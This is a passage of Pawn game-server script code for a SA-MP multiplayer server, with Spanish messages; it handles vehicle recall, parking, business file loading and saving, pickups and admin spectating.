	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner7] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned7]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned7]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned7]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned7],10);
	SetTimerEx("CallVehicle7ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar8(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner8] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned8]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned8]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned8]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned8],10);
	SetTimerEx("CallVehicle8ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar9(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner9] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned9]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned9]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned9]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned9],10);
	SetTimerEx("CallVehicle9ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar10(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner10] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned10]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned10]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned10]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned10],10);
	SetTimerEx("CallVehicle10ToPlayer",5000,0,"i",playerid);
	return 1;
}

stock park(playerid)
{
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para usar este comando.");
	    return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no esta en venta.");
		return 1;
	}
	if((PlayerInfo[playerid][vowner] == 0) && (PlayerInfo[playerid][vowner2] == 0) && (PlayerInfo[playerid][vowner3] == 0) && (PlayerInfo[playerid][vowner4] == 0) && (PlayerInfo[playerid][vowner5] == 0) && (PlayerInfo[playerid][vowner6] == 0) && (PlayerInfo[playerid][vowner7] == 0) && (PlayerInfo[playerid][vowner8] == 0)) {
		if((PlayerInfo[playerid][vowner9] == 0) && (PlayerInfo[playerid][vowner10] == 0)){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo para usar este comando.");
			return 1;
		}
	}
//	if(GetPlayerMoney(playerid) <10000) return SendClientMessage(playerid, COLOR_BRIGHTRED, "You need $10000 to park your car!");
	if(IsPlayerInAnyVehicle(playerid)) {
		if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
			new Float:spx,Float:spy,Float:spz;
			new Float:spa;
	//		GivePlayerMoney(playerid,-10000);
			GetVehiclePos(GetPlayerVehicleID(playerid),spx,spy,spz);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),spa);
			VehicleInfo[GetPlayerVehicleID(playerid)][x_spawn] = spx;
			VehicleInfo[GetPlayerVehicleID(playerid)][y_spawn] = spy;
			VehicleInfo[GetPlayerVehicleID(playerid)][z_spawn] = spz;
			VehicleInfo[GetPlayerVehicleID(playerid)][za_spawn] = spa;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Acabas de aparcar tu {5783C2}%s{EAEAEA} con exito. Desde ahora aparecera en este sitio.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este no es tu vehiculo.");
			return 1;
		}
	}
	else {
		SendClientMessage(playerid, COLOR_BRIGHTRED, "|Error| »{EAEAEA} Debes estar en tu vehiculo para usar este comando.");
		return 1;
	}
}

stock parkadmin(playerid)
{
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
	}
    /*if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para usar este comando.");
	    return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no esta en venta.");
		return 1;
	}
	if((PlayerInfo[playerid][vowner] == 0) && (PlayerInfo[playerid][vowner2] == 0) && (PlayerInfo[playerid][vowner3] == 0) && (PlayerInfo[playerid][vowner4] == 0) && (PlayerInfo[playerid][vowner5] == 0) && (PlayerInfo[playerid][vowner6] == 0) && (PlayerInfo[playerid][vowner7] == 0) && (PlayerInfo[playerid][vowner8] == 0)) {
		if((PlayerInfo[playerid][vowner9] == 0) && (PlayerInfo[playerid][vowner10] == 0)){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo para usar este comando.");
			return 1;
		}
	}*/
//	if(GetPlayerMoney(playerid) <10000) return SendClientMessage(playerid, COLOR_BRIGHTRED, "You need $10000 to park your car!");
	if(IsPlayerInAnyVehicle(playerid)) {
		//if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
		new Float:spx,Float:spy,Float:spz;
		new Float:spa;
	//	GivePlayerMoney(playerid,-10000);
		GetVehiclePos(GetPlayerVehicleID(playerid),spx,spy,spz);
		GetVehicleZAngle(GetPlayerVehicleID(playerid),spa);
		VehicleInfo[GetPlayerVehicleID(playerid)][x_spawn] = spx;
		VehicleInfo[GetPlayerVehicleID(playerid)][y_spawn] = spy;
		VehicleInfo[GetPlayerVehicleID(playerid)][z_spawn] = spz;
		VehicleInfo[GetPlayerVehicleID(playerid)][za_spawn] = spa;
		format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Acabas de aparcar tu {5783C2}%s{EAEAEA} con exito. Desde ahora aparecera en este sitio.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
		SendClientMessage(playerid, red, securemess);
		return 1;
		}
		//else {
			//SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este no es tu vehiculo.");
			//return 1;
		//}
	//}
	else {
		SendClientMessage(playerid, COLOR_BRIGHTRED, "|Error| »{EAEAEA} Debes estar en tu vehiculo para usar este comando.");
		return 1;
	}
}

stock apark(playerid)
{
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInfo[playerid][Level] == 9) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	if(IsPlayerInAnyVehicle(playerid)) {
		new Float:spx,Float:spy,Float:spz;
		new Float:spa;
		GetVehiclePos(GetPlayerVehicleID(playerid),spx,spy,spz);
		GetVehicleZAngle(GetPlayerVehicleID(playerid),spa);
		VehicleInfo[GetPlayerVehicleID(playerid)][x_spawn] = spx;
		VehicleInfo[GetPlayerVehicleID(playerid)][y_spawn] = spy;
		VehicleInfo[GetPlayerVehicleID(playerid)][z_spawn] = spz;
		VehicleInfo[GetPlayerVehicleID(playerid)][za_spawn] = spa;
		format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Acabas de aparcar el vehiculo {5783C2}%s{EAEAEA} con exito. Desde ahora aparecera en este sitio.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
		SendClientMessage(playerid, red, securemess);
		return 1;
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el vehiculo.");
		return 1;
	}
}
//============================= Stuff=====================================
stock CountVehicles(filename[]) {
	new File:VehicleFile;
	new blank[256];
	new count = 0;
	if (fexist(V_FILE_SAVE)) {
		VehicleFile = fopen(V_FILE_SAVE);
		while(fread(VehicleFile, blank, sizeof blank)) {
			count++;
		}
		fclose(VehicleFile);
	}
	else {
		VehicleFile = fopen(filename);
		while(fread(VehicleFile, blank, sizeof blank)) {
			count++;
		}
		fclose(VehicleFile);
	}
	return count;
}

stock CountBusinesses(filename[]) {
	new File:BusinessFile;
	new blank[128];
	new count = 0;
	if (fexist(B_FILE_SAVE)) {
		BusinessFile = fopen(B_FILE_SAVE);
		while(fread(BusinessFile, blank, sizeof blank)) {
			count++;
		}
		fclose(BusinessFile);
	}
	else {
		BusinessFile = fopen(filename);
		while(fread(BusinessFile, blank, sizeof blank)) {
			count++;
		}
		fclose(BusinessFile);
	}

	return count;
}

stock split(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new slen;

	while(i <= strlen(strsrc)){
		if(strsrc[i]==delimiter || i==strlen(strsrc)){
			slen = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][slen] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return 1;
}

stock LoadBusinesses()
{
	if(fexist(B_FILE_SAVE)) {
        new SplitDiv[99][B_LIMIT];
		new filestring[128];
		new File: file = fopen(B_FILE_SAVE, io_read);
		if (file) {
	    	for(new bizid = 0;bizid<bizcount;bizid++)
			{
		    	fread(file, filestring);
				split(filestring, SplitDiv, ',');
				BizInfo[bizid][xpos] = floatstr(SplitDiv[0]);
				BizInfo[bizid][ypos] = floatstr(SplitDiv[1]);
				BizInfo[bizid][zpos] = floatstr(SplitDiv[2]);
				BizInfo[bizid][inter] = strval(SplitDiv[3]);
				strmid(BizInfo[bizid][owner], SplitDiv[4], 0, strlen(SplitDiv[4]), 255);
				strmid(BizInfo[bizid][name], SplitDiv[5], 0, strlen(SplitDiv[5]), 255);
				BizInfo[bizid][bought] = strval(SplitDiv[6]);
				BizInfo[bizid][cost] = strval(SplitDiv[7]);
				BizInfo[bizid][profit] = strval(SplitDiv[8]);
				BizInfo[bizid][cashbox] = strval(SplitDiv[9]);
				if(BizInfo[bizid][bought] == 0) {
					BizInfo[bizid][ico] = CreateDynamicMapIcon(BizInfo[bizid][xpos],BizInfo[bizid][ypos],BizInfo[bizid][zpos],52,250);
				}
				else {
		    		BizInfo[bizid][ico] = CreateDynamicMapIcon(BizInfo[bizid][xpos],BizInfo[bizid][ypos],BizInfo[bizid][zpos],52,250);
				}
			 	CreateDynamicPickup(B_ICON,B_ICON_TYPE, BizInfo[bizid][xpos], BizInfo[bizid][ypos], BizInfo[bizid][zpos]);

				bizTextInfo[bizid] = Text3D:INVALID_3DTEXT_ID;
				new bizowner[25];
				format(bizowner,128,"%s",BizInfo[bizid][owner]);
				if(strcmp(BizInfo[bizid][owner],DEFAULT_OWNER,false) == 0) {
			    	format(bizowner,128,"En Venta");
			 		bizTextInfo[bizid] = CreateDynamic3DTextLabel(bizowner,0x00FF00FF,floatstr(SplitDiv[0]),floatstr(SplitDiv[1]),floatstr(SplitDiv[2])+0.75,40);
				}
				else {
			 		bizTextInfo[bizid] = CreateDynamic3DTextLabel(bizowner,0xFF0000FF,floatstr(SplitDiv[0]),floatstr(SplitDiv[1]),floatstr(SplitDiv[2])+0.75,40);
			 	}
				new addmess[128];
				format(addmess,sizeof(addmess),"--:: Business %d (%s) successfully spawned - owner: %s ::--",bizid,BizInfo[bizid][name],BizInfo[bizid][owner]);
				//print(addmess);
			}
		}
		fclose(file);
	}
	else {
		SetupBizFile();
	}
}

stock SaveBusinesses()
{
	new filestring[128];
	new File: bfile = fopen(B_FILE_SAVE, io_write);
	for(new bizid = 0;bizid<bizcount;bizid++)
	{
		format(filestring, sizeof(filestring), "%f,%f,%f,%d,%s,%s,%d,%d,%d,%d\n",
		BizInfo[bizid][xpos],
		BizInfo[bizid][ypos],
		BizInfo[bizid][zpos],
		BizInfo[bizid][inter],
		BizInfo[bizid][owner],
		BizInfo[bizid][name],
		BizInfo[bizid][bought],
		BizInfo[bizid][cost],
		BizInfo[bizid][profit],
		BizInfo[bizid][cashbox]
		);
		fwrite(bfile, filestring);
	}
	fclose(bfile);
}

stock CargarJugadores(bizid)
{
	/*new file2[128];
	new File: file3;
	file3 = fopen("/ladmin/users/ListaJugadores.txt");
	new filestring[128];
	new NombreJugador;
	//for(new MaximoDeJugadoresRegistrados=0;MaximoDeJugadoresRegistrados<17;MaximoDeJugadoresRegistrados++)
	//{
		NombreJugador=fread(file3, filestring);
		format(file2,256,"/ladmin/users/%s.sav",NombreJugador);
 		//if(udb_Exists(PlayerName2(NombreJugador))) 
		//{
			//PlayerInfo[i][name] = playername;
			//PlayerInfo[i][bowner] = (dUserINT(PlayerName2(playerid)).("bowner"));
			//if(bizid == (dUserINT(PlayerName2(NombreJugador)).("bowned")))
			//{
				new addmess[128];
				format(addmess,sizeof(addmess),"Nombre del jugador, %s", 	NombreJugador);
				print(addmess);
				//BizInfo[bizid][owner] = NombreJugador;
				strmid(BizInfo[bizid][owner], NombreJugador, 0, strlen(NombreJugador), 255);
				//strmid(dest[], const source[], start=0, end=cellmax, maxlength=sizeof dest);
			//} 
		//}

	//}
	fclose(file3);*/
	/*new buf[64], i;
	i = 0;
	while(ffind("ladmin/users/*.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		//dini_IntSet(fname, "Houseid", -255);
		if(bizid == (dUserINT(PlayerName2(fname)).("bowned"))){
			BizInfo[bizid][owner] = buf;
		}
	}*/
}

stock SetupBizFile()
{
    new File: file;
    new SplitDiv[99][B_LIMIT];
	new filestring[128];
	file = fopen(B_FILE_LOAD, io_read);
	for(new bizid=0;bizid<bizcount;bizid++)
	{
		if (file)
		{
			fread(file, filestring);
		 	split(filestring, SplitDiv, ',');
			BizInfo[bizid][xpos] = floatstr(SplitDiv[0]);
			BizInfo[bizid][ypos] = floatstr(SplitDiv[1]);
			BizInfo[bizid][zpos] = floatstr(SplitDiv[2]);
			BizInfo[bizid][inter] = strval(SplitDiv[3]);

			strmid(BizInfo[bizid][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
			//CargarJugadores(bizid);

			strmid(BizInfo[bizid][name], SplitDiv[4], 0, 23, 255);
			BizInfo[bizid][bought] = 0;
			BizInfo[bizid][cost] = strval(SplitDiv[5]);
			BizInfo[bizid][profit] = strval(SplitDiv[6]);
			BizInfo[bizid][cashbox] = 0;
			if(BizInfo[bizid][bought] == 0) {
 				BizInfo[bizid][ico] = CreateDynamicMapIcon(BizInfo[bizid][xpos],BizInfo[bizid][ypos],BizInfo[bizid][zpos],52,250);
			}
			else {
 				BizInfo[bizid][ico] = CreateDynamicMapIcon(BizInfo[bizid][xpos],BizInfo[bizid][ypos],BizInfo[bizid][zpos],52,250);
			}
            CreateDynamicPickup(B_ICON,B_ICON_TYPE, BizInfo[bizid][xpos], BizInfo[bizid][ypos], BizInfo[bizid][zpos]);
			new addmess[128];
			format(addmess,sizeof(addmess),"--:: Business %d (%s) successfully spawned ::--",bizid,BizInfo[bizid][name]);
			print(addmess);
		}
	}
	fclose(file);
	print(">------------------------------------------------");
	print(" ");
	print(">------------------------------------------------");
	print("Initialising Business File System - Please Wait For Confirmation...");
	print(" ");
	SaveBusinesses();
	print(" ");
	print("Business File System 100% Initialised...");
	print(">------------------------------------------------");
	printf(" ");
}
public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(pickupid == drift)
	{
		new Float:X,Float:Y,Float:Z,Float:Angle,LVehicleIDt; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
		LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,-1,-1,10000);
		PutPlayerInVehicle(playerid,LVehicleIDt,0);
		AddVehicleComponent(LVehicleIDt,1028);
		AddVehicleComponent(LVehicleIDt,1169);
		AddVehicleComponent(LVehicleIDt,1141);
		AddVehicleComponent(LVehicleIDt,1032);
		AddVehicleComponent(LVehicleIDt,1138);
		AddVehicleComponent(LVehicleIDt,1026);
		AddVehicleComponent(LVehicleIDt,1027);
		ChangeVehiclePaintjob(LVehicleIDt, 0);
		AddVehicleComponent(LVehicleIDt,1080);
		ChangeVehicleColor(LVehicleIDt, 1, 1);
		AddVehicleComponent(LVehicleIDt,1010);
		PlayerPlaySound(playerid,1133,0.0,0.0,0.0); ChangeVehiclePaintjob(LVehicleIDt,0);
		SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid));
		LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
		VehicleInfo[LVehicleIDt][Temp] = 1;
		return 1;
	}
	if(pickupid == pickup_reja1){
		GameTextForPlayer(playerid,"~w~/Reja1",5000,3);
		return 1;
	}
	if(pickupid == pickup2_reja1){
		GameTextForPlayer(playerid,"~w~/Reja1",5000,3);
		return 1;
	}
	return 1;
}
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	new p = ClosestBiz(playerid);
 	if(pickupid < 3) {
    	GameTextForPlayer(playerid,"~w~/BankCmds",5000,3);
		return 1;
	}
	if(pickupid < bizcount+2) {
		new bizowner[250];
		format(bizowner,250,"%s",BizInfo[p][owner]);
		if(strcmp(BizInfo[p][owner],DEFAULT_OWNER,false) == 0) {
			format(bizowner,250,"En Venta");
		}
		new bizmes[250];
		format(bizmes,250,"~n~~n~~g~Negocio: ~w~%s~n~~g~Precio: ~w~$%d ~r~~n~~g~Ganancias: ~w~$%d/hr ~n~~g~Propietario: ~w~%s",BizInfo[p][name],BizInfo[p][cost],BizInfo[p][profit]*2,bizowner);
		GameTextForPlayer(playerid,bizmes,5000,3);
		return 1;
	}
	if(GetHouseID(playerid) != -255) GetHouseStats(playerid, GetHouseID(playerid));
	if(pickupid==tower)
	{
		SetPlayerPos(playerid,3309.7100,-32.0005,81.8662);
		GivePlayerWeapon(playerid,46,1);
//		DestroyPickup(tower);
//		tower=CreatePickup(1559,2,3291.8503,-15.8325,370.7765); // Tower pickup
		return 1;
	}
	if(pickupid==floor)
	{
		GivePlayerWeapon(playerid,46,1);
		SetPlayerPos(playerid,3291.5085,-17.2533,370.7691);
//		DestroyPickup(floor);
//		floor=CreatePickup(1559,2,3308.2422,-30.3998,81.8584); // Floor pickup
		return 1;
	}
	return 1;
}

stock CloseToBank(playerid)
{
	new Float:maxdis = 20.0;
	new Float:ppos[3];
	GetPlayerPos(playerid, ppos[0], ppos[1], ppos[2]);
	for(new i = 0;i<3;i++) {
		if (ppos[0] >= floatsub(Pickup[i][0], maxdis) && ppos[0] <= floatadd(Pickup[i][0], maxdis)
		&& ppos[1] >= floatsub(Pickup[i][1], maxdis) && ppos[1] <= floatadd(Pickup[i][1], maxdis)
		&& ppos[2] >= floatsub(Pickup[i][2], maxdis) && ppos[2] <= floatadd(Pickup[i][2], maxdis))
		{
			return i;
		}
	}
	return 999;
}

stock ClosestBiz(playerid)
{
	new Float:ppos[3];
	new Float:maxdis = 7.0;
	GetPlayerPos(playerid, ppos[0], ppos[1], ppos[2]);
	for(new i = 0;i<bizcount;i++) {
		if (ppos[0] >= floatsub(BizInfo[i][xpos], maxdis) && ppos[0] <= floatadd(BizInfo[i][xpos], maxdis)
		&& ppos[1] >= floatsub(BizInfo[i][ypos], maxdis) && ppos[1] <= floatadd(BizInfo[i][ypos], maxdis)
		&& ppos[2] >= floatsub(BizInfo[i][zpos], maxdis) && ppos[2] <= floatadd(BizInfo[i][zpos], maxdis))
		{
			return i;
		}
	}
	return 999;
}

stock GetClosestPlayer(playerid) //By Slick (edited by Gabriel "Larcius" Cordes)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(0))
	{
		new closestplayer=0;
		new Float:closestdist=GetDistanceBetweenPlayers(playerid,0);
		for(new playerid2=0; playerid2<MAX_PLAYERS; playerid2++)
		{
			new Float:dist = GetDistanceBetweenPlayers(playerid,playerid2);
			if ((dist < closestdist))
			{
				closestdist = dist;
				closestplayer = playerid;
			}
		}
		return closestplayer;
	}
	return -1;
}

stock IsPlayerNameOnline(compname[])
{
	new playername[MAX_PLAYER_NAME];
	for(new i=0;i<=MAX_PLAYERS;i++) {
		if(IsPlayerConnected(i)) {
			GetPlayerName(i, playername, sizeof(playername));
			if(strcmp(playername,compname,false) == 0) {
				return i;
			}
		}
	}
	return 1000;
}

stock IsPlayerClose(playerid,Float:x,Float:y,Float:z,Float:MAX)
{
	new Float:PPos[3];
	if(IsPlayerConnected(playerid)) {
			GetPlayerPos(playerid, PPos[0], PPos[1], PPos[2]);
			if (PPos[0] >= floatsub(x, MAX) && PPos[0] <= floatadd(x, MAX)
			&& PPos[1] >= floatsub(y, MAX) && PPos[1] <= floatadd(y, MAX)
			&& PPos[2] >= floatsub(z, MAX) && PPos[2] <= floatadd(z, MAX))
			{
				return 1;
			}
	}
	return 0;
}
//==============================================================================
#if defined ENABLE_SPEC

stock StartSpectate(playerid, specplayerid)
{
	for(new x=0; x<MAX_PLAYERS; x++) {
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid) {
	       AdvanceSpectate(x);
		}
	}
	SetPlayerInterior(playerid,GetPlayerInterior(specplayerid));
	TogglePlayerSpectating(playerid, 1);

	if(IsPlayerInAnyVehicle(specplayerid)) {
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specplayerid));
		PlayerInfo[playerid][SpecID] = specplayerid;
		PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
	}
	else {
		PlayerSpectatePlayer(playerid, specplayerid);
		PlayerInfo[playerid][SpecID] = specplayerid;
		PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_PLAYER;
	}
	new string[100], Float:hp, Float:ar;
	GetPlayerName(specplayerid,string,sizeof(string));
	GetPlayerHealth(specplayerid, hp);	GetPlayerArmour(specplayerid, ar);
	//format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~w~%s - id:%d~n~< sprint - jump >~n~hp:%0.1f ar:%0.1f $%d", string,specplayerid,hp,ar,GetPlayerMoney(specplayerid) );
	//GameTextForPlayer(playerid,string,25000,3);
	return 1;
}

stock StopSpectate(playerid)
{
	TogglePlayerSpectating(playerid, 0);
	PlayerInfo[playerid][SpecID] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_NONE;
	//GameTextForPlayer(playerid,"~n~~n~~n~~w~Spectate mode ended",1000,3);
	return 1;
}

stock AdvanceSpectate(playerid)
{
    if(LConnectedPlayers() == 2) { StopSpectate(playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][SpecID]+1; x<=MAX_PLAYERS; x++)
		{
	    	if(x == MAX_PLAYERS) x = 0;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

stock ReverseSpectate(playerid)
{
    if(LConnectedPlayers() == 2) { StopSpectate(playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][SpecID]-1; x>=0; x--)
		{
	    	if(x == 0) x = MAX_PLAYERS;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

